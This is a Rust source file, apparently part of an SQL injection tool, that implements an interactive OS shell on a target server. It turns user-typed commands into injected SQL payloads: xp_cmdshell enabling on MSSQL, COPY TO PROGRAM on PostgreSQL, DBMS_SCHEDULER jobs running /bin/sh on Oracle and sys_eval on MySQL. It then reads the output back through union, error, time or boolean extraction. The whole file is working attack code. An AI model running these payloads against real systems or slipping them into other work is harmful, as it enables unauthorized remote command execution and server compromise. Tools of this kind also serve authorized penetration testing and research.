//! Interactive OS shell via SQL injection command execution.
//!
//! Provides a REPL interface that executes OS commands on the target server
//! through DBMS-specific command execution primitives.

use anyhow::{Context, Result};
use std::io::Write;
use tracing::{debug, info, warn};

use crate::sqx::{
    detector::SqliDetector,
    models::HttpResponse,
    shell::fast_extract::{AdaptiveExtractor, FastTechnique},
    shell::types::{detect_os_shell_methods, OsShellMethod, ShellConfig, ShellResult, ShellSession, ShellTechnique},
};

/// Interactive OS shell.
pub struct OsShell<'a> {
    detector: &'a SqliDetector,
    url: String,
    param: String,
    original_value: String,
    dbms: String,
    config: ShellConfig,
    session: ShellSession,
    baseline: HttpResponse,
    method: Option<OsShellMethod>,
    extractor: AdaptiveExtractor,
    working_dir: String,
    current_technique: Option<FastTechnique>,
}

impl<'a> OsShell<'a> {
    /// Create a new OS shell instance.
    pub async fn new(
        detector: &'a SqliDetector,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        config: ShellConfig,
    ) -> Result<Self> {
        info!("Initializing OS shell for {} on {}", dbms, url);

        // Get baseline for extraction
        let baseline = detector
            .send_request(url)
            .await
            .context("Failed to get baseline request")?;

        // Detect available methods for this DBMS
        let available_methods = detect_os_shell_methods(dbms);
        let method = available_methods.first().copied();

        if method.is_none() {
            warn!("No OS shell methods available for {}", dbms);
        } else {
            info!("Using OS shell method: {:?}", method);
        }

        Ok(Self {
            detector,
            url: url.to_string(),
            param: param.to_string(),
            original_value: original_value.to_string(),
            dbms: dbms.to_string(),
            config,
            session: ShellSession::new(),
            baseline,
            method,
            extractor: AdaptiveExtractor::new(),
            working_dir: ".".to_string(),
            current_technique: None,
        })
    }

    /// Run the interactive REPL.
    pub async fn run_repl(&mut self) -> Result<()> {
        if self.method.is_none() {
            eprintln!("[!] No OS command execution methods available for {}.", self.dbms);
            eprintln!("[!] This DBMS may not support direct OS command execution via SQL injection.");
            return Ok(());
        }

        // Calibrate extraction technique for reading command output
        println!("[*] Calibrating extraction technique...");
        self.extractor
            .calibrate(
                self.detector,
                &self.url,
                &self.param,
                &self.original_value,
                &self.dbms,
                &self.baseline,
            )
            .await?;

        println!("╔═══════════════════════════════════════════════════════════════╗");
        println!("║              SQX Interactive OS Shell                         ║");
        println!("╠═══════════════════════════════════════════════════════════════╣");
        println!("║  DBMS: {:55} ║", self.dbms);
        println!("║  URL:  {:55} ║", self.url.chars().take(55).collect::<String>());
        
        if let Some(method) = self.method {
            println!("║  Method: {:52} ║", method.description());
        }
        
        if let Some(tech) = self.extractor.preferred_technique {
            println!("║  Extraction: {:46} ║", tech.to_string());
            self.current_technique = Some(tech);
        }
        
        println!("╚═══════════════════════════════════════════════════════════════╝");
        println!();

        println!("Type OS commands to execute. Special commands:");
        println!("  .pwd             - Show current directory");
        println!("  .cd <path>       - Change working directory");
        println!("  .whoami          - Show current user");
        println!("  .method          - Show execution method");
        println!("  .technique       - Show extraction technique");
        println!("  .calibrate       - Recalibrate extraction");
        println!("  .help            - Show this help");
        println!("  .exit            - Exit shell");
        println!();
        println!("⚠️  WARNING: OS command execution may create logs and leave traces!");
        println!();

        let stdin = std::io::stdin();
        let mut stdout = std::io::stdout();

        loop {
            print!("{}$ ", self.working_dir);
            stdout.flush()?;

            let mut input = String::new();
            stdin.read_line(&mut input)?;
            let input = input.trim();

            if input.is_empty() {
                continue;
            }

            // Handle special commands
            if input.starts_with('.') {
                match self.handle_meta_command(input).await {
                    Ok(should_exit) => {
                        if should_exit {
                            break;
                        }
                    }
                    Err(e) => {
                        eprintln!("[!] Error: {}", e);
                    }
                }
                continue;
            }

            // Execute OS command with timing
            let start = std::time::Instant::now();
            match self.execute_os_command(input).await {
                Ok(result) => {
                    self.session.add_entry(
                        input.to_string(),
                        result.output.clone(),
                        result.success,
                    );
                    self.session.add_requests(result.requests);

                    let elapsed = start.elapsed();
                    if result.success {
                        if !result.output.is_empty() {
                            println!("{}", result.output);
                        }
                        println!("-- {} requests in {:?} --", result.requests, elapsed);
                    } else {
                        eprintln!("[!] Command failed: {}", result.output);
                    }
                }
                Err(e) => {
                    eprintln!("[!] Execution error: {}", e);
                }
            }
        }

        println!("\n[*] OS shell session ended.");
        println!("[*] Total requests: {}", self.session.total_requests);
        println!("[*] Commands executed: {}", self.session.history.len());
        Ok(())
    }

    /// Handle meta-commands (starting with .)
    async fn handle_meta_command(&mut self, cmd: &str) -> Result<bool> {
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        let command = parts.first().copied().unwrap_or("");

        match command {
            ".exit" | ".quit" => {
                println!("[*] Exiting...");
                return Ok(true);
            }
            ".help" => {
                println!("Special commands:");
                println!("  .pwd             - Show current directory");
                println!("  .cd <path>       - Change working directory");
                println!("  .whoami          - Show current user");
                println!("  .method          - Show execution method");
                println!("  .technique       - Show extraction technique");
                println!("  .calibrate       - Recalibrate extraction");
                println!("  .status          - Show session status");
                println!("  .help            - Show this help");
                println!("  .exit            - Exit shell");
            }
            ".pwd" => {
                match self.execute_os_command("pwd").await {
                    Ok(result) => println!("{}", result.output.trim()),
                    Err(e) => eprintln!("[!] Failed: {}", e),
                }
            }
            ".cd" => {
                if parts.len() < 2 {
                    eprintln!("[!] Usage: .cd <path>");
                } else {
                    let new_dir = parts[1];
                    let test_cmd = format!("cd {} && pwd", new_dir);
                    match self.execute_os_command(&test_cmd).await {
                        Ok(result) => {
                            if result.success && !result.output.is_empty() {
                                self.working_dir = result.output.trim().to_string();
                                println!("[*] Working directory: {}", self.working_dir);
                            } else {
                                eprintln!("[!] Cannot change to directory: {}", new_dir);
                            }
                        }
                        Err(e) => eprintln!("[!] Failed: {}", e),
                    }
                }
            }
            ".whoami" => {
                match self.execute_os_command("whoami").await {
                    Ok(result) => println!("{}", result.output.trim()),
                    Err(e) => eprintln!("[!] Failed: {}", e),
                }
            }
            ".method" => {
                if let Some(method) = self.method {
                    println!("Execution method: {}", method.description());
                    println!("DBMS: {}", self.dbms);
                    match method {
                        OsShellMethod::XpCmdshell => println!("Required: sysadmin role"),
                        OsShellMethod::CopyToProgram => println!("Required: SUPERUSER"),
                        OsShellMethod::UtlFileScheduler => println!("Required: UTL_FILE execute"),
                        OsShellMethod::IntoOutfileUdf => println!("Required: FILE + sys_eval UDF"),
                        OsShellMethod::SqliteLoadExtension => println!("Required: Custom extension"),
                    }
                } else {
                    println!("No execution method available");
                }
            }
            ".technique" => {
                if let Some(tech) = self.current_technique {
                    println!("Current extraction technique: {}", tech);
                    match tech {
                        FastTechnique::Union => println!("Speed: ~1 request per command (FAST)"),
                        FastTechnique::Error => println!("Speed: ~1 request per command (FAST)"),
                        FastTechnique::Time => println!("Speed: ~7-8 requests per character (SLOW)"),
                        FastTechnique::Boolean => println!("Speed: ~7-8 requests per character (SLOW)"),
                    }
                } else {
                    println!("No technique calibrated yet. Run .calibrate first.");
                }
            }
            ".calibrate" => {
                println!("[*] Recalibrating extraction technique...");
                match self.extractor.calibrate(
                    self.detector,
                    &self.url,
                    &self.param,
                    &self.original_value,
                    &self.dbms,
                    &self.baseline,
                ).await {
                    Ok(_) => {
                        if let Some(tech) = self.extractor.preferred_technique {
                            println!("[+] Calibrated to: {}", tech);
                            self.current_technique = Some(tech);
                        }
                    }
                    Err(e) => eprintln!("[!] Calibration failed: {}", e),
                }
            }
            ".status" => {
                println!("Session status:");
                println!("  DBMS: {}", self.dbms);
                if let Some(method) = self.method {
                    println!("  Method: {}", method.description());
                }
                if let Some(tech) = self.current_technique {
                    println!("  Extraction: {}", tech);
                }
                println!("  Working directory: {}", self.working_dir);
                println!("  Total requests: {}", self.session.total_requests);
                println!("  Commands executed: {}", self.session.history.len());
                if let Some(start) = self.session.start_time {
                    let duration = chrono::Utc::now() - start;
                    println!("  Session duration: {}m {}s", duration.num_minutes(), duration.num_seconds() % 60);
                }
            }
            _ => {
                eprintln!("[!] Unknown command: {}. Type .help for available commands.", command);
            }
        }

        Ok(false)
    }

    /// Execute an OS command and return the result.
    pub async fn execute_os_command(&self, cmd: &str) -> Result<ShellResult> {
        debug!("Executing OS command: {}", cmd);

        let method = self.method.context("No OS shell method available")?;
        let sql = self.build_execution_query(method, cmd)?;

        // Use adaptive extractor with calibration
        let result = self.extractor.extract(
            self.detector,
            &self.url,
            &self.param,
            &self.original_value,
            &self.dbms,
            &sql,
            &self.baseline,
            self.config.max_output_length,
        ).await?;

        let success = !result.output.is_empty() || result.requests > 0;
        Ok(ShellResult {
            command: cmd.to_string(),
            output: result.output,
            success,
            requests: result.requests,
            duration_ms: 0,
        })
    }

    /// Build the SQL query for OS command execution based on method.
    fn build_execution_query(&self, method: OsShellMethod, cmd: &str) -> Result<String> {
        let dbms = self.dbms.to_lowercase();
        
        match method {
            OsShellMethod::XpCmdshell => {
                if !dbms.contains("mssql") && !dbms.contains("sqlserver") {
                    return Err(anyhow::anyhow!("xp_cmdshell only works on MSSQL"));
                }
                let safe_cmd = cmd.replace("'", "''");
                Ok(format!(
                    "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '{}'",
                    safe_cmd
                ))
            }
            OsShellMethod::CopyToProgram => {
                if !dbms.contains("postgres") {
                    return Err(anyhow::anyhow!("COPY TO PROGRAM only works on PostgreSQL"));
                }
                // This creates a temp table with command output
                let safe_cmd = cmd.replace("'", "''");
                Ok(format!(
                    "COPY (SELECT '') TO PROGRAM '{}'",
                    safe_cmd
                ))
            }
            OsShellMethod::UtlFileScheduler => {
                warn!("Oracle OS shell is limited; may not capture output properly");
                let safe_cmd = cmd.replace("'", "''");
                Ok(format!(
                    "BEGIN DBMS_SCHEDULER.create_job(job_name=>'X',job_type=>'EXECUTABLE',job_action=>'/bin/sh',number_of_arguments=>2,enabled=>FALSE); DBMS_SCHEDULER.set_job_argument_value('X',1,'-c'); DBMS_SCHEDULER.set_job_argument_value('X',2,'{}'); DBMS_SCHEDULER.enable('X'); END",
                    safe_cmd
                ))
            }
            OsShellMethod::IntoOutfileUdf => {
                let safe_cmd = cmd.replace("'", "''");
                Ok(format!("SELECT sys_eval('{}')", safe_cmd))
            }
            OsShellMethod::SqliteLoadExtension => {
                Err(anyhow::anyhow!("SQLite OS shell requires pre-planted malicious extension"))
            }
        }
    }
}
